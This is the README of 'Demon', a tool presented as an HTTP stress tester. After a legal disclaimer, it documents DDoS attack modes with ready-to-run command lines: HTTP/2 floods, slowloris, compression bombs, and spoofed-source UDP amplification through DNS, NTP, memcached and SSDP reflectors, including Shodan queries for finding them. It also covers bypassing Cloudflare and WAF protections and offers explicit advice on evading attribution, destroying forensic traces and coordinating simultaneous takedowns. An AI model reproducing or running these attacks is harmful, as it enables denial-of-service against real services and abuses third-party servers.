# Demon a HTTP stress testing tool


[![demon preview](images/demon.gif)](images/demon.mp4)


If you run a web service and want to know how it behaves under pressure before your users find out for you, load testing against your own infrastructure is what it was built for. Finding out that your server falls over at 400 concurrent connections during a controlled test on a random afternoon is a much better outcome than finding out during a product launch. Used that way (against systems you own or have written authorization to test, with a clear scope) this tool gives you signal: real HTTP stack behavior, real TLS negotiation overhead, real connection exhaustion patterns.


> ## _Legality_

> **US (Computer Fraud and Abuse Act - 18 U.S.C. § 1030)**
>- Unauthorized access or intentional damage to a protected computer is a federal crime
>- A "DDoS" attack causing >$5,000 in losses (easy to hit, just count server costs and lost revenue during downtime) is a straight up felony: up to 10 years first offense, up to 20 years if repeat or if critical infrastructure is involved
>- "Protected computer" means essentially any computer connected to the internet, not just government systems
>- The bar for prosecution is pretty low. The DoJ has gone after people for attacks on small private websites before.

> **UK (Computer Misuse Act 1990)**
>- Unauthorized impairment of computer operation: up to 10 years
>- The NCA actively pursues DDoS cases and has extradition agreements with the US

>**EU (Directive 2013/40/EU)**
>- Member states must criminalize attacks causing serious damage with minimum 2 years, up to 5 years for organized group or significant damage.

>**Civil liability**
>- Separate from criminal charges, the target can sue for damages. If you take down a business for 4 hours and they can document $50k in lost revenue, that's a civil judgment on top of any criminal penalty.

> **What "getting caught" would look like...**
> 
> This tool attempts to protect users to the best of its ability but ultimately traffic originates from your IP or your proxies. Furthermore proxy providers log. CDNs log every request with source IP and timestamp. A subpoena to your ISP or the proxy provider gets your real identity. Datacenter proxies offer essentially no cover, they log too. Residential proxies log too, just at a different provider.

> **The only legal use**
>- Running this against infrastructure **you own, or infrastructure you have explicit written authorization to test**. "Penetration testing" without a signed scope of work agreement is not a defense.

>**Note:**
> - _If the target slows down but stays up and you have no authorization, it's still unauthorized access/damage, the threshold is just $5,000 aggregate damage, which includes staff time to respond, not just potential lost revenue_
> - _If nothing actually happens (site handles it fine), prosecution becomes harder to pursue practically, but the attempt is still the offense_
> - _The run history in your terminal are all discoverable and establish intent._
> - _Hitting a hospital, bank, or government system escalates automatically regardless of outcome._
> - A single source flood that causes a measurable outage is the same offense as a botnet driven one. The first "D" in DDoS does not matter here.

Please be safe...

---

_**Running it well**_

_A few things that make the difference between a run that tells you something and one that doesn't:_

- _**Your proxies are your best protection, not a VPN.** The proxy rotation built into this tool does more for origin masking than any VPN. Traffic appearing from hundreds of different residential IPs is harder to block and harder to trace back to one person than traffic through a single VPN exit node. Use -rotate-proxy or supply your own list. If you're sourcing proxies yourself, residential SOCKS5 paid for with crypto and a throwaway account is the realistic ceiling for origin masking without a real botnet behind you._
- _**Coordinate if you can.** Multiple people running simultaneously against the same target multiplies the effect more than one person cranking up concurrency, because the traffic comes from genuinely different source networks. Agree on a synchronized start time, staggered runs are much less effective than simultaneous ones. Split attack types across participants if you can: one person holding connections with slowloris while another floods with HTTP/2 hits different server subsystems at the same time. How you coordinate is your business, just not in a channel that ties back to you._
- _**Start low and ramp.** Jumping straight to -concurrency 1000 tells you whether the server survives 1000 concurrent connections. Ramping from 50 upward tells you where it starts degrading, which is usually the number you actually want._
- _**Watch the receiving end while it runs.** The useful data is what happens on the server, CPU spike, connection pool saturation, error rate climbing. Not the request count demon reports. Pull up metrics, logs, or just top before you start._
- _**Run it from a clean environment.** Don't run this from a machine you use for anything personal. Terminal history, and browser history on the same machine during a run are all part of the picture if anyone ever looks. A live boot that leaves nothing on the host is the clean option. At minimum, treat the machine as dedicated for the duration._
- _**Have a goal and know when you've hit it.** Decide what outcome you're after before you start, take it down, slow it to unusable, confirm it can't handle a specific load. Have a defined stop condition. Running indefinitely past an achieved outcome adds exposure for no additional gain._

---

## Build

```bash
go build -o demon .
```

Requires Go 1.21+. All dependencies are vendored in go.mod.

---

## Usage

```
./demon [FLAGS] <target>
```

The target argument accepts:

- Full URL: `https://<example>.com/path`
- Bare hostname: `<example.com>`, `https://` is prepended automatically
- Bare IP: `1.2.3.4`, `https://` is prepended automatically, so it hits port 443. Use `http://1.2.3.4:8080` if you need a specific port over plain HTTP
- `host:port` for UDP flood (attack type 10), the scheme is stripped internally anyway, so pass `1.2.3.4:53` or just `1.2.3.4` (defaults to port 80)

---

## Flags

### Core

| flag | default | what it does |
|---|---|---|
| `-attack <0-10 or list>` | `0` | Selects the attack type. See [attack types](#attack-types) below. Pass a single number (`-attack 2`) for one type, or a comma separated list (`-attack 2,7`) to run multiple types simultaneously, workers randomly pick from the list each job. |
| `-concurrency <n>` | `100` | Number of simultaneous workers. Each worker holds its own HTTP client and proxy assignment. Higher values increase connection pressure. |
| `-rate <n>` | `1000` | Target requests per second across all workers. Enforced via a token bucket limiter, workers block when the budget is exhausted. Setting rate lower than concurrency starves workers and wastes goroutines. |
| `-duration <s>` | config file | How long to run. Accepts Go duration strings: `30s`, `5m`, `1h`, `2h30m`. Pass `0` or `infinite` to run until Ctrl+C. |
| `-infinite` | false | Equivalent to `-duration 0`. Runs until you kill it. |
| `-config <file>` | `demon_config.json` | Load settings from a JSON config file. Flags on the command line override whatever is in the file. |

### Proxies

| flag | default | what it does |
|---|---|---|
| `-proxies <file>` | none | Path to a text file with one proxy per line. Supported formats: `socks5://user:pass@host:port`, `socks5://host:port`, `http://user:pass@host:port`, `http://host:port`, `host:port` (treated as HTTP). Residential SOCKS5 proxies are the only type that consistently defeats CDN IP reputation blocking. Free scraped proxies are datacenter IPs that Cloudflare and Akamai pre flag. |
| `-rotate-proxy` | false | When no `-proxies` file is given, automatically scrapes and validates anonymous proxies from public sources before the run starts. A background goroutine refreshes the pool every 5 minutes during the run. Scraped proxies are datacenter IPs, useful for unprotected targets, not CDN protected ones. |

### Evasion and anonymity

| flag | default | what it does |
|---|---|---|
| `-rotate-ua` | true | Randomly selects a different User Agent header for each request from a pool of realistic browser strings. |
| `-randomize-headers` | true | Adds randomized browser like secondary headers (`Cache-Control`, `Pragma`, `Sec-Fetch-*`) on a probabilistic basis to vary request fingerprints. |
| `-cache-bust` | true | Appends unique query parameters (`_t=`, `rand=`, etc.) to every URL so CDN and proxy caches cannot serve a cached response. Forces the origin server to handle each request. This is a *modifier* overlaid on whatever attack type you run (e.g. `-attack 2 -cache-bust`), distinct from [attack type 3](#3--cache-busting), which is a dedicated cache-busting flood. On by default; pass `-cache-bust=false` to disable it for a run. |
| `-waf-evade` | false | Overlays structural bypass variants on every request. Each request uses one of six shapes: URL-encoded path, HTTP parameter pollution, content-type mismatch (JSON body + form content-type), overloaded query string (20 junk params before real ones), path traversal normalization (`/./path`), or JSON POST body. Because each shape requires a different WAF rule to catch, no single rule covers the full traffic stream. Applies to all attack types except type 5 (which already does this by definition) and the connection hold attacks (1, 6, 8) that do not send full HTTP requests. |
| `-tls-fingerprint` | false | Replaces Go's stdlib TLS handshake with a uTLS ClientHello that mimics a real browser (Chrome 133, Chrome 131, Chrome 120, Firefox 120). Go's default ClientHello is trivially identified by Cloudflare, Akamai, and AWS Shield at the TLS layer before HTTP is even parsed. This flag is required to reach the application layer on those platforms. Automatically pins the matching browser User Agent to the handshake profile so both signals are consistent. |
| `-keepalive-abuse` | false | Switches the HTTP transport to an aggressive keep-alive configuration: disables idle connection timeouts, sets maximum connection counts to zero (unlimited), and forces HTTP/2 negotiation. The intent is to hold server-side connection slots open across many requests rather than releasing them after each one. |
| `-http2` | true | Forces `ForceAttemptHTTP2: true` on the transport, preferring h2 negotiation. The h2 transport is configured with Chrome's SETTINGS values (`HEADER_TABLE_SIZE=65536`, `MAX_HEADER_LIST_SIZE=262144`) to match real browser h2 fingerprints. |
| `-mimic-behavior` | false | On VOLUME_ATTACK (type 0), replaces the raw request loop with a simulated user session: thinktime pauses between requests, realistic session durations (5 minutes), variable page view counts, and 40% bounce rate simulation. Makes traffic patterns look like a real user rather than a flood. |

### Rate limit bypass

These four flags activate an intelligent bypass system that monitors response patterns and adapts timing to avoid triggering server side rate limiters.

| flag | default | what it does |
|---|---|---|
| `-bypass-ratelimits` | false | Master switch for the rate limit bypass system. Enables response monitoring for 429, 503, `Retry-After` headers, slow response times, and suspicious body patterns. Without this flag the other three below do nothing. |
| `-distributed-timing` | false | Adds jitter to inter request timing drawn from a Gaussian distribution rather than firing at a fixed interval. Which mimics the natural variance in human request timing. Requires `-bypass-ratelimits`. |
| `-smart-throttle` | false | When 429s or rate limit signals are detected, automatically backs off using exponential delay with a configurable multiplier. As the target stops sending 429s, the rate ramps back up. Requires `-bypass-ratelimits`. |
| `-adaptive-rate` | false | Tracks request success rate over a rolling window and adjusts worker concurrency dynamically, reducing workers under pressure and increasing them when the target is responding normally. Requires `-bypass-ratelimits`. |

### Output

| flag | default | what it does |
|---|---|---|
| `-verbose` | false | Sets log level to DEBUG. Prints detailed per request and system events. |
| `-quiet` | false | Sets log level to ERROR. Suppresses everything except errors. The live dashboard still renders. |

### Tuning

These expose what used to be hardcoded constants. Each also lives in the config file (keys in parentheses); `0` means "use the built in default".

| flag | default | what it does |
|---|---|---|
| `-h2-connections <n>` | `4` | HTTP/2 flood (type 2): number of independent h2 connections the 100 streams are spread across. One connection is easy for the server to reset or backpressure; a handful keeps the flood alive if it kills one. (`http2_connections`) |
| `-bomb-size-mb <n>` | `64` | Compression bomb (type 7): decompressed body size in MB. The wire payload stays tiny (zeros compress ~1000:1); this is what the server allocates if it decompresses. (`bomb_size_mb`) |
| `-max-held-connections <n>` | `50000` | Cap on connections held simultaneously by hold attacks (types 1/6/8). A backstop that protects **your own** machine, hold types are dispatched fire and forget, so a long run would otherwise spawn unbounded held connection goroutines. You usually hit your OS fd limit first. (`max_held_connections`) |
| `-max-udp-floods <n>` | `8` | Cap on concurrent UDP flood invocations (type 10). A safety backstop, not a throughput knob: the root/raw-socket path spawns ~150 thread pinning goroutines per invocation, so high `-concurrency` without this cap crashes the runtime (`failed to create new OS thread`). Raising it only helps on a fat pipe (10GbE+) you can't already saturate at 8 **and** with a raised `ulimit -u`; raising it too far re-opens the crash. Lowering it is always safe here. (`max_udp_floods`) |
| `-dns-amplifiers <file>` | — | Path to a text file of open DNS resolver IPs (one per line). Replaces the built in hardcoded list. Shodan query: `port:53 recursion:1`. Blank lines and `#` comments are ignored; `ip:port` lines are trimmed to just the IP. |
| `-ntp-amplifiers <file>` | — | Path to a text file of NTP server IPs with monlist enabled. Replaces the built in list. Shodan query: `port:123 "ntpd"`. |
| `-memcached-amplifiers <file>` | — | Path to a text file of publicly open memcached instances. Replaces the default random IP probing fallback, a real list dramatically improves hit rate. Shodan query: `port:11211 product:memcached`. |
| `-ssdp-amplifiers <file>` | — | Path to a text file of publicly routable UPnP device IPs. **Required to enable the SSDP vector**, the old hardcoded list was entirely private/multicast addresses the router drops before they leave your network; SSDP is disabled by default until you supply real IPs. Shodan query: `port:1900 upnp`. |
| `-discover-amplifiers` | false | Probe random internet IPs for live amplifiers before attacking. Runs all four protocol scans concurrently and populates each vector list from actually responding servers. Requires no extra privileges (uses plain UDP sockets, not raw sockets). Results can be combined with file loaded lists. |
| `-discover-timeout <sec>` | `45` | Time budget for `-discover-amplifiers`, in seconds. Each protocol scan stops independently when it hits `-discover-count` or the deadline, whichever comes first. |
| `-discover-count <n>` | `50` | How many live amplifiers to find per protocol before stopping discovery. |
| `-discover-save` | false | Write discovered amplifiers to `amplifiers_dns.txt`, `amplifiers_ntp.txt`, etc. after discovery so you can reuse them with the file flags on the next run without re scanning. |

### Bandwidth / congestion control

A single machine can't send more than its uplink. Past that point the excess **queues and drops at your own egress**. It never reaches the target. That self congestion is what makes a run "kill itself": your health checks time out (you'll see the `[uplink maxed]` status), your box chugs, and the target sees nothing extra. These two knobs keep your output at line rate instead of overshooting it. They make you *efficient*, not more powerful, the uplink ceiling is physics; for more real volume, run [`fleet.sh`](#fleet-mode-multi-machine) across more machines.

| flag | default | what it does |
|---|---|---|
| `-bandwidth <rate>` | uncapped | Cap **UDP egress** to a byte/sec budget so a flood paces to your uplink instead of saturating it. Accepts `40mbit`, `5MB`, `500kbit`, `1gbit`, or a plain bytes/sec number (bit rate suffixes are bits; byte suffixes are bytes). Set it to ~your real upload speed. (`bandwidth`) |
| `-adaptive-bandwidth` | true | Safety net: when the health monitor detects **local** congestion (your uplink maxed, *not* the target down), auto throttle the send rate (AIMD, halve on congestion, ramp back as it clears) and log it. On by default since overshooting your own uplink never helped; pass `-adaptive-bandwidth=false` to disable. (`adaptive_bandwidth`) |

> `-bandwidth` paces the UDP flood specifically (where uncapped byte blasting is the problem); HTTP attacks are paced by `-rate` plus the adaptive backoff. The raw socket reflection path (type 10 under root) is **not** byte-paced, only the direct UDP flood is, though the adaptive backoff still throttles its dispatch rate. Example: `./demon -attack 10 -bandwidth 40mbit -duration 5m <target>` blasts UDP at ~40 Mbit/s flat instead of self-congesting.

### How impact is measured (Effectiveness / Target Health)

The dashboard's **Effectiveness / Impact Level** is computed from the **attack traffic's own latency and error rate**. The most direct evidence the tool has, **not** from how many requests you sent. Sending a million requests a target absorbs at 50 ms is *not* impact; one that pins it at 25 s *is*, regardless of count. Concretely:

- **A timeout is recorded at its full duration**, so it lands in the slow latency tail. A fast `403`/`429` (the target cheaply rejecting you, that's the target *winning*, not you) stays in the fast buckets and is **excluded** from the impact signal. This is how the score tells "target saturated" apart from "target defending."
- The score scales with a **sample size confidence ramp** (a few hundred completed round trips), so a handful of slow requests early in a run can't spike it.
- A **control confirmed kill** (you reached the target, then it went dark while Google/Cloudflare stayed reachable) is a definitive 100%.

**Status / Target Health labels:**

| label | meaning |
|---|---|
| `[up]` | Target answering quickly, absorbing your load |
| `[slow]` | Answering, but latency is elevated |
| `[degraded]` | Over half your round trips are slow/timing out, the target is buckling, and control hosts confirm it's the target, not your link |
| `[down]` | Unreachable while control hosts stayed up, a genuine, attributable failure |
| `[uplink maxed]` | Even Google/Cloudflare are unreachable from your box -> **your own uplink is saturated**, so the degradation can't be cleanly attributed to the target vs your link |
| `[unknown]` | Uplink saturated and the traffic showed no clear degradation, genuinely couldn't measure |

> **The honest caveat about a single box:** when your uplink saturates, "the target is failing" and "my own pipe is full" look identical from one machine — both make the site unreachable *from here*. In that case the report shows the **observed** degradation as real (it is — your traffic is timing out) but flags that part of it may be local, and tells you how to find out: cap `-bandwidth` to your real uplink (so your link stops being the bottleneck and any remaining degradation is attributable to the target), or spread load across machines with [`fleet.sh`](#fleet-mode-multi-machine). It will **not** silently claim a takedown it can't prove, and it will **not** report "low impact / target up" while your traffic is timing out — the earlier versions did both, in opposite directions.

### Proxy acquisition

When `-rotate-proxy` is on, these bound how hard and how long the tool works to build a proxy pool at startup. Acquisition stops at **whichever comes first**: enough good proxies, or the time budget. A partial pool acquired fast beats a full pool acquired slowly — the refresh tops it up during the run.

| flag | default | what it does |
|---|---|---|
| `-proxy-target <n>` | `50` | Stop acquiring once this many proxies pass all validation gates. 50 working proxies saturate any run; raising it costs more startup time for diminishing returns on free proxy quality. (`proxy_target_count`) |
| `-proxy-acquire-timeout <sec>` | `45` | Hard-ish time budget for acquisition. When it elapses, the tool proceeds with whatever it has rather than grinding a mostly-dead pool. (soft edge: the ≤100 in-flight validations finish first, so worst case is ~budget + one test round.) (`proxy_acquire_timeout_sec`) |
| `-proxy-refresh-interval <sec>` | `300` | How often the background refresh scrapes + validates fresh proxies and merges them into the live worker pool, replenishing what eviction prunes. (`proxy_refresh_interval_sec`) |
| `-proxy-test-timeout <sec>` | `5` | Timeout for each individual validation round-trip (connectivity, anonymity, target reachability). This is the per proxy speed lever: a proxy that's going to fail costs up to this long per gate it reaches. Lower it to acquire faster at the cost of a few false negatives on slow but working proxies. (`proxy_test_timeout`) |

**Examples:**

```bash
# fast start, grabs a small pool quickly, then lets the refresh grow it during the run.
# low per test timeout drops slow proxies fast; 20s budget caps startup.
./demon -attack 0 -rate 3000 -rotate-proxy \
  -proxy-target 30 -proxy-test-timeout 2 -proxy-acquire-timeout 20 -duration 30m <target>

# thorough start, spend longer up front to build a larger, better vetted pool,
# and refresh more often on a long run so the pool stays healthy.
./demon -attack 2 -rate 5000 -rotate-proxy -http2 \
  -proxy-target 150 -proxy-acquire-timeout 120 -proxy-refresh-interval 120 -infinite <target>

# patient validation, keep slow but working proxies (higher per test timeout)
# when the free pool is thin and you can't afford to discard marginal ones.
./demon -attack 3 -rate 2000 -rotate-proxy \
  -proxy-target 40 -proxy-test-timeout 10 -proxy-acquire-timeout 90 -duration 1h <target>
```

These pair with the existing proxy flags (`-rotate-proxy`, `-proxy <file>`) and apply only when the tool is acquiring proxies itself, a `-proxy <file>` list is used verbatim and skips acquisition entirely.

---

## Attack types

### 0 — Volume attack

Fires high frequency HTTP requests as fast as the rate limiter allows. Each call uses a random method (GET, POST, HEAD, OPTIONS, PUT, DELETE, PATCH), adds browser headers, and optionally applies cache busting and WAF evasion variants. Goal is raw request volume, overwhelming the server's request processing capacity, thread pool, or upstream rate limiter.

### 1 — Slowloris

Opens a real TCP/TLS connection, sends the start of an HTTP/1.1 request (request line + Host + User-Agent), then keeps the connection alive indefinitely by dripping one extra header every 10 seconds. Each held connection occupies one server thread or async handler slot. Works by accumulating enough simultaneous half open connections to exhaust the server's connection pool before any single request completes. HTTP/2 is forced off, h2 servers close streams that receive no HEADERS frame.

### 2 — HTTP/2 flood

Fires 100 concurrent streams over a single persistent h2 connection per worker. HTTP/2 multiplexes all streams over one TCP socket, so the server handles 100 logical in flight requests against a single file descriptor. Targets the server's h2 stream scheduler and per stream buffer allocation rather than the fd table. The shared transport is initialized once and reused across batches so the underlying connection stays alive, without this, each batch would just tear down and reestablish TCP+TLS, degrading it to an expensive h1 flood.

### 3 — Cache busting

Forces every request to bypass CDN and reverse proxy caches by appending unique query parameters (`_t=<nanoseconds>`, `rand=<random>`, plus a random named parameter). Each request generates a unique URL the CDN has never seen, so every request is a cache miss that must be forwarded to origin. Effective against targets that rely on CDN offload to handle their traffic, the CDN passes everything through and origin takes full load.

Unlike the `-cache-bust` flag (which *overlays* cache-busting params onto whatever attack type you're running), this mode is a dedicated cache-busting flood, busting the cache is the whole attack, applied unconditionally. Same technique, two roles: the flag adds it to another attack, type 3 makes it the attack. (The `-waf-evade` flag and [attack type 5](#5--waf-bypass) relate the same way.)

### 4 — API fuzzing

Sends 50 concurrent requests per worker to common API endpoint paths (`/api/v1/users`, `/api/search`, `/admin`, `/graphql`, etc.) with randomized HTTP methods and payloads. Payloads cycle through: structured JSON objects, arrays, large strings (10,000 chars), deeply nested objects, null, and empty bodies. Adds `X-Requested-With: XMLHttpRequest` and `Content-Type: application/json` to trigger API-specific server code paths. Targets backend business logic and database layers rather than just the HTTP layer.

### 5 — WAF bypass

Sends 75 concurrent requests per worker, each using a randomly chosen structural bypass variant (six variants: URL encoded path, HTTP parameter pollution, content-type mismatch, overloaded query string, path traversal normalization, JSON POST). A WAF writing a rule for one variant does not automatically catch the other five. Unlike `-waf-evade` (which overlays these shapes onto other attack types), this mode is focused entirely on the bypass technique rather than volume.

### 6 — Protocol exploit (slow POST)

Announces a 2GB `Content-Length` in the request headers, then trickles one byte of body every 5 seconds. The server receives complete headers, opens a read buffer waiting for the declared body, and ties up one server thread indefinitely. Distinct from slowloris (which stalls during header parsing). This stalls after headers are fully received, which bypasses WAFs that only timeout on partial header connections. Runs "fire and forget" so the worker can stack many simultaneous held connections.

### 7 — Bandwidth saturation (compression bomb)

Sends authentic gzip compressed request bodies that decompress to 64MB on the server. Zeros compress at roughly 1000:1, so the wire payload is about 64KB but forces the server to allocate a 64MB decompression buffer per request. Sends 25 concurrent bomb requests per worker invocation. Effective against servers that decompress request bodies before routing (common in middleware stacks). Servers without decompression size limits allocate the full buffer.

### 8 — Connection exhaustion

Completes a full TCP/TLS handshake then sends nothing. The server's accepted socket goroutine blocks waiting for the first byte of an HTTP request that never arrives. Each worker adds one held silent connection; the attack depletes the server's file descriptor table and OS TCP socket buffer pool. Unlike slowloris there is no post handshake byte stream to detect the connection is genuinely silent. Connections are held until the context is cancelled (duration reached or Ctrl+C).

### 9 — Resource exhaustion

Sends 30 concurrent POST requests per worker, each containing a payload chosen to maximize server side CPU and memory cost. Four payload types rotate randomly: XML entity expansion (billion laughs structure at bounded depth, forces recursive entity resolution), deeply nested JSON (5000 levels forces recursive descent stack allocation), ReDoS bait (8000 `a` chars followed by `!`, triggers catastrophic backtracking on vulnerable regex validators), and large form encoded payloads. Targets backend processing cost rather than network volume.

### 10 — UDP flood

Two execution paths depending on privileges.

**Reflection/amplification path (requires root or CAP_NET_RAW):** opens a raw IP socket with `IP_HDRINCL` and hand crafts each packet's IPv4 header, spoofing the source IP as the victim's IP. The tool sends small requests to third party amplifier servers; those servers send their much larger responses directly to the victim. Four reflection vectors run simultaneously across 120 goroutines (500 packets each), plus 30 additional goroutines sending fragmented UDP directly to the victim, 150 goroutines total per invocation:

- **DNS EDNS0** (port 53): queries "." IN NS with a 4096-byte EDNS0 buffer and the DNSSEC-OK bit set. Elicits a DNSSEC-signed NS response (~600 bytes) against a ~30-byte query — roughly 20–28x. Targets less-monitored open resolvers (Yandex, Freenom, 114DNS, DNSPod, Quad101, CleanBrowsing) rather than the major providers that rate limit heavily. NS queries are not subject to RFC 8482 (which only restricts ANY responses), so patched resolvers still respond.
- **NTP monlist** (port 123): Mode 7 REQ_MON_GETLIST_1 against stratum-2 NTP servers. Unpatched ntpd replies with up to 100 packets listing every client it has served, up to 556x amplification. CVE-2013-5211 is over a decade old and many stratum-2 servers were never patched.
- **Memcached stats** (port 11211): 15 byte UDP stats command with UDP framing header. Open memcached instances reply with their full stats output, typically 10–100KB on a loaded server, up to 50,000x. The 2018 GitHub attack (1.35 Tbps) used this vector exclusively. For best results, replace the default random IP fallback with real open instances from a Shodan scan (`port:11211 product:memcached`).
- **SSDP M-SEARCH** (port 1900): UPnP discovery request sent to publicly routable IPs with port 1900 exposed (internet-facing routers and IoT devices with UPnP accidentally left open). Each responds with its full device description XML — ~30x amplification. **This vector is disabled by default.** The old hardcoded list was entirely private/multicast addresses (`239.255.255.250`, `192.168.x.x`, `10.0.0.1`) that upstream routers drop before the packets leave your network — from any VPS or non-LAN host they accomplish nothing. Enable it by passing `-ssdp-amplifiers <file>` (Shodan: `port:1900 upnp`) or `-discover-amplifiers`.
- **Fragmented UDP** (direct to victim): splits a 1000 byte UDP datagram into two IP fragments sharing the same IP ID, sent directly to the victim with random spoofed source IPs. The victim's IP reassembly subsystem must hold each incomplete fragment chain until a kernel timer fires, Linux defaults to 30 seconds and caps the reassembly queue at 4MB (roughly 8,000 concurrent chains). 500 fragment pairs per goroutine pushes well past that ceiling. Fragment 2 carries no UDP header, so destination port based firewall rules that inspect only the first fragment let it through unconditionally.

The spoofed source port is randomized per packet so amplifier responses scatter across the victim's port space rather than all arriving on one port, defeating port specific firewall rules.

**Direct flood fallback (no privileges):** when the raw socket cannot be opened (unprivileged user, sandboxed environment), falls back to 60 pps goroutines sending 1 byte packets (maximizes packet rate) and 60 bps goroutines sending 1400 byte packets (maximizes byte throughput), running simultaneously, 60,000 packets per invocation. Source IPs are real, no amplification.

Target for UDP: any scheme is stripped before the socket is opened, so pass `1.2.3.4`, `1.2.3.4:53`, or even `https://1.2.3.4`. Omitting a port cycles across `[53, 80, 123, 443, 1900, 5353, 11211]` so a single port firewall rule cannot block everything.

---

## Command reference

### Light / test runs

```bash
# confirm binary works, 1 worker, 10 req/s, 15 seconds
./demon -concurrency 1 -rate 10 -duration 15s <target>

# 20 workers, 200 req/s, 30 seconds, verbose output
./demon -concurrency 20 -rate 200 -duration 30s -verbose <target>

# volume attack with realistic browser headers, 30 second window
./demon -attack 0 -concurrency 50 -rate 500 -rotate-ua -randomize-headers -duration 30s <target>

# API fuzzing dry run, enumerate endpoints at low pressure
./demon -attack 4 -concurrency 10 -rate 100 -rotate-ua -duration 60s <target>/api

# udp direct flood baseline, no root needed, confirms fallback path works, 20 seconds
./demon -attack 10 -concurrency 10 -rate 200 -duration 20s <target>
```

### Sustained / moderate pressure

```bash
# slowloris, fill connection pool over 10 minutes
./demon -attack 1 -concurrency 200 -rate 500 -keepalive-abuse -duration 10m <target>

# volume flood with proxy rotation and evasion, 30 minute run
./demon -attack 0 -concurrency 150 -rate 3000 -rotate-proxy -rotate-ua -waf-evade -randomize-headers -duration 30m <target>

# HTTP/2 flood with cdn bypass techniques, 20 minute run
./demon -attack 2 -concurrency 200 -rate 4000 -http2 -cache-bust -randomize-headers -duration 20m <target>

# resource exhaustion, burn backend cpu, 15 minute run
./demon -attack 9 -concurrency 100 -rate 2000 -cache-bust -http2 -duration 15m <target>
# cache busting, strip cdn offload, force every request to origin
./demon -attack 3 -concurrency 150 -rate 3000 -rotate-ua -randomize-headers -http2 -duration 20m <target>
# rate limit bypass for squarespace / shopify / platform targets
./demon -attack 0 -concurrency 100 -rate 2000 -bypass-ratelimits -distributed-timing -smart-throttle -adaptive-rate -rotate-proxy -rotate-ua -mimic-behavior -duration 30m <target>

# udp amplification, root required; dns/ntp/memcached fire by default, ssdp requires -ssdp-amplifiers or -discover-amplifiers
sudo ./demon -attack 10 -concurrency 50 -rate 1000 -duration 10m <target>

# udp amplification against a specific service, pin port to maximize amplifier hit rate
sudo ./demon -attack 10 -concurrency 50 -rate 1000 -duration 10m <target>:53
sudo ./demon -attack 10 -concurrency 50 -rate 1000 -duration 10m <target>:11211
```

### Hard hitting / maximum impact

```bash
# maximum http/2 flood, browser tls + proxy rotation + all evasion
./demon -attack 2 -concurrency 500 -rate 12000 -http2 -tls-fingerprint -rotate-proxy -rotate-ua -waf-evade -randomize-headers -cache-bust -keepalive-abuse -infinite <target>

# maximum slowloris, 600 held connections
./demon -attack 1 -concurrency 600 -rate 1500 -keepalive-abuse -rotate-proxy -http2 -randomize-headers -waf-evade -infinite <target>

# connection exhaustion, drain fd table
./demon -attack 8 -concurrency 500 -rate 4500 -keepalive-abuse -rotate-proxy -waf-evade -http2 -infinite <target>

# compression bomb, 64MB decompression allocation per request
./demon -attack 7 -concurrency 500 -rate 6000 -cache-bust -http2 -rotate-proxy -waf-evade -randomize-headers -keepalive-abuse -infinite <target>

# protocol exploit, 2GB body slow post, stacks held server threads
./demon -attack 6 -concurrency 400 -rate 5000 -http2 -keepalive-abuse -rotate-proxy -waf-evade -infinite <target>

# resource exhaustion at max pressure
./demon -attack 9 -concurrency 450 -rate 6000 -cache-bust -http2 -rotate-proxy -waf-evade -randomize-headers -keepalive-abuse -infinite <target>

# udp direct flood, no root, network layer saturation, pps + bps groups simultaneously
./demon -attack 10 -concurrency 300 -rate 8000 -infinite <target>

# udp multi protocol amplification, root required, spoofed source ip, all four vectors
sudo ./demon -attack 10 -concurrency 200 -rate 5000 -infinite <target>

# udp amplification pinned to ntp port, maximizes monlist amplifier responses
sudo ./demon -attack 10 -concurrency 200 -rate 5000 -infinite <target>:123

# tag team: udp network flood + http/2 application flood, hits network layer and app layer simultaneously
sudo ./demon -attack 10,2 -concurrency 400 -rate 8000 -http2 -infinite <target>

# tag team: udp amplification + connection exhaustion, saturates bandwidth while draining fd table
sudo ./demon -attack 10,8 -concurrency 400 -rate 6000 -keepalive-abuse -infinite <target>
```

### Against Cloudflare / Akamai / AWS Shield

These platforms block Go's default TLS fingerprint and datacenter proxy IPs at the TLS layer before HTTP is parsed. `-tls-fingerprint` is required. `-proxies` must point to residential SOCKS5, scraped datacenter proxies will not work.

```bash
# minimum viable cloudflare bypass, tls fingerprint + residential proxies
./demon -attack 2 -concurrency 200 -rate 3000 -http2 -tls-fingerprint -proxies residential.txt -rotate-ua -waf-evade -cache-bust -duration 30m <target>

# full evasion stack against cdn protected target
./demon -attack 2 -concurrency 300 -rate 5000 -http2 -tls-fingerprint -proxies residential.txt -rotate-ua -waf-evade -randomize-headers -cache-bust -bypass-ratelimits -distributed-timing -smart-throttle -infinite <target>

# WAF bypass against a protected api
./demon -attack 5 -concurrency 200 -rate 3000 -tls-fingerprint -proxies residential.txt -rotate-ua -randomize-headers -cache-bust -duration 45m <target>

# slowloris against tls inspecting proxy (completes handshake first)
./demon -attack 1 -concurrency 300 -rate 800 -keepalive-abuse -tls-fingerprint -proxies residential.txt -randomize-headers -infinite <target>
```

---

### Tag team mode

Pass a comma separated list to `-attack` to run multiple attack types simultaneously in a single process. Workers randomly pick one type from the list each job, so the traffic is a genuine mix rather than alternating runs. All flags apply to every type in the pool.

```bash
# h2 flood + compression bomb, workers split randomly across both
./demon -attack 2,7 -concurrency 500 -rate 8000 -http2 -rotate-proxy -waf-evade -infinite <target>

# connection exhaustion + resource burn, drains fd table while burning backend cpu
./demon -attack 8,9 -concurrency 400 -rate 5000 -keepalive-abuse -http2 -infinite <target>

# three way: volume flood + cache busting + api fuzzing
./demon -attack 0,3,4 -concurrency 600 -rate 10000 -rotate-proxy -rotate-ua -waf-evade -randomize-headers -cache-bust -infinite <target>

# udp amplification + http/2 flood — network layer and application layer at the same time
sudo ./demon -attack 10,2 -concurrency 500 -rate 8000 -http2 -rotate-proxy -infinite <target>
```

> **Hold type note:** types 1 (slowloris), 6 (slow POST), and 8 (connection exhaustion) block for the full duration once dispatched. They hold a connection and never cycle back to pick a different type. If you include one of them in a tag team list, those workers contribute held connections while every other worker cycles normally. Mixing `-attack 1,2` means some workers hold slowloris connections and the rest loop through h2 floods. That is the intended behavior.

Alternatively, run two separate processes and let the OS multiplex the traffic:

```bash
# two processes, each with its own rate budget
./demon -attack 2 -concurrency 300 -rate 8000 -http2 -infinite <target> &
./demon -attack 7 -concurrency 200 -rate 4000 -http2 -infinite <target>
```

> **Orphan nuance:** if you run the above manually, killing the foreground process with Ctrl+C leaves the backgrounded one still running. Use `tagteam.sh` instead since it wraps both processes so a single Ctrl+C stops both cleanly.

```bash
./tagteam.sh <target> 2 300 8000 7 200 4000 -http2 -infinite
```

---

### Fleet mode (multi machine)

